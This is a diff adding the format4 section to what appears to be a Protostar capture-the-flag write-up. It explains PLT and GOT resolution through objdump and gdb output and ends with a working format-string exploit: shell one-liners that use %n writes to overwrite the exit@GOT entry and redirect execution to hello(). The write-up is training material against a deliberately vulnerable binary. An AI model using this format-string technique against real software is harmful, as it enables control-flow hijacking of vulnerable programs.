@@ -32,7 +32,9 @@
   - [format3: write byte by byte](#format3-write-byte-by-byte)
     - [format3 solution A: 2 bytes write (%n$hn)](#format3-solution-a-2-bytes-write-nhn)
     - [format3 solution B: 1 byte write (the almighty)](#format3-solution-b-1-byte-write-the-almighty)
-  - [format4: plt && got](#format4-plt--got)
+  - [format4: Procedure Linkage Table (PLT) and Global Offset Table (GOT)](#format4-procedure-linkage-table-plt-and-global-offset-table-got)
+    - [format4, process](#format4-process)
+    - [format4, solution](#format4-solution)
 
 ## stack0
 
@@ -502,4 +504,135 @@ set SHELL=/bin/bash
   # 0x44 -> 0x44 -> 68 + 17 -> 0x55 + 173 -> 0x102, which is 0x02 0x01.
 ```
 
-## format4: plt && got
+## format4: Procedure Linkage Table (PLT) and Global Offset Table (GOT)
+
+```asm
+# objdump -M intel -d ./format4| awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
+
+080484d2 <vuln>:
+ 80484d2:       55                      push   ebp
+ 80484d3:       89 e5                   mov    ebp,esp
+ 80484d5:       81 ec 18 02 00 00       sub    esp,0x218
+ 80484db:       a1 30 97 04 08          mov    eax,ds:0x8049730
+ 80484e0:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
+ 80484e4:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
+ 80484eb:       00
+ 80484ec:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
+ 80484f2:       89 04 24                mov    DWORD PTR [esp],eax
+ 80484f5:       e8 a2 fe ff ff          call   804839c <fgets@plt>
+ 80484fa:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
+ 8048500:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048503:       e8 c4 fe ff ff          call   80483cc <printf@plt>
+ 8048508:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
+ 804850f:       e8 d8 fe ff ff          call   80483ec <exit@plt>
+
+# gdb
+# disassemble 0x80483ec
+# Dump of assembler code for function exit@plt:
+0x080483ec <exit@plt+0>:        jmp    DWORD PTR ds:0x8049724
+0x080483f2 <exit@plt+6>:        push   0x30
+0x080483f7 <exit@plt+11>:       jmp    0x804837c
+# End of assembler dump.
+
+(shell) objdump -d ./format4
+  # 080484b4 <hello>:
+  # ...
+set {int}0x8049724=0x80484b4
+c
+  # flag
+```
+
+```gdb
+b *vuln + 61
+r
+  # hit breapoint 1
+disassemble 0x80483ec
+  # x/8i 0x80483ec
+  # Dump of assembler code for function exit@plt:
+  # 0x080483ec <exit@plt+0>:        jmp    *0x8049724
+  # 0x080483f2 <exit@plt+6>:        push   $0x30
+  # 0x080483f7 <exit@plt+11>:       jmp    0x804837c
+  # End of assembler dump.
+si
+  # 0x080483ec in exit@plt ()
+si
+  # 0x080483f2 in exit@plt ()
+si
+  # 0x080483f7 in exit@plt ()
+
+x/8i 0x0804837c
+  # 0x804837c:      pushl  0x8049704                      <- which is the address of the GOT table
+  # 0x8048382:      jmp    *0x8049708                     <- which is <_dl_runtime_resolve>
+  # 
+  # (gdb) disassemble 0x8049704
+  # Dump of assembler code for function _GLOBAL_OFFSET_TABLE_:
+  # 0x08049700 <_GLOBAL_OFFSET_TABLE_+0>:   sub    $0x96,%al
+  # ...
+si
+  # 0x08048382 in ?? ()
+
+disassemble *0x8049708
+  # Dump of assembler code for function _dl_runtime_resolve:
+  # 0xb7ff6200 <_dl_runtime_resolve+0>:     push   %eax
+  # 0xb7ff6201 <_dl_runtime_resolve+1>:     push   %ecx
+  # 0xb7ff6202 <_dl_runtime_resolve+2>:     push   %edx
+  # 0xb7ff6203 <_dl_runtime_resolve+3>:     mov    0x10(%esp),%edx
+  # 0xb7ff6207 <_dl_runtime_resolve+7>:     mov    0xc(%esp),%eax
+  # 0xb7ff620b <_dl_runtime_resolve+11>:    call   0xb7ff0550 <_dl_fixup>
+  # 0xb7ff6210 <_dl_runtime_resolve+16>:    pop    %edx
+  # 0xb7ff6211 <_dl_runtime_resolve+17>:    mov    (%esp),%ecx
+  # 0xb7ff6214 <_dl_runtime_resolve+20>:    mov    %eax,(%esp)
+  # 0xb7ff6217 <_dl_runtime_resolve+23>:    mov    0x4(%esp),%eax
+  # 0xb7ff621b <_dl_runtime_resolve+27>:    ret    $0xc
+  # End of assembler dump.
+
+(shell) pidof format4; cat /proc/2424/maps
+  # info proc map
+  # 08048000-08049000 r-xp 00000000 00:10 7054       /opt/protostar/bin/format4
+  # 08049000-0804a000 rwxp 00000000 00:10 7054       /opt/protostar/bin/format4
+  # ...
+  # b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
+  # b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so             <- where 0xb7ff6200 belongs
+  # ...
+  # bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
+
+(shell) man ld.so
+  # dynamic linker/loader
+  # which upon first execute, update the exit@GOT entry [0x8049724], so that it points to the real location of a `libc` function.
+  # Initially, the <exit@plt+0> or [0x8049724] points to <exit@plt+6>, which leads to the <_dl_runtime_resolve> call.
+```
+
+- hence, the first jmp in `<func@plt+0>` is equivalent to an `JMP ESP`, i.e., `set {int}0x8049724=0x80484b4` redirect the flow.
+
+### format4, process
+
+```bash
+# fuzz
+./format4 <<< "%x %x %x"
+  # objdump -d ./format4
+  # 080484b4 <hello>:
+```
+
+```bash
+./format4 <<< $(echo -en 'AAAA';for i in {0..12};do echo -en '|%x';done;echo -en '%x';)
+./format4 <<< $(echo -en 'AAAA';echo -en '%4$x';)
+  # the target is *0x08049724 <- 0x80484b4
+  # \x24\x97\x04\x08
+./format4 <<< $(echo -en '\x24\x97\x04\x08';echo -en '%4$x';)
+./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08';echo -en '%5$x';echo -en '%4$x';)
+  # from lower address to higher, \xb4 \x84 \x804
+./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%4$x%5$x%6$x';)
+./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%4$n';)
+  # segfault, dmesg at 0xc
+./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%5$168x%4$n';)
+  # int(0xb4 - 0xc) -> 168
+./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%3$168x%4$n%3$208x%5$n%3$1664x%6$n';)
+  # int(0x184 - 0xb4) -> 208
+  # int(0x804 - 0x184) -> 1664
+```
+
+### format4, solution
+
+```bash
+./format4 <<< $(echo -en '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08';echo -en '%3$168x%4$n%3$208x%5$n%3$1664x%6$n';)
+```
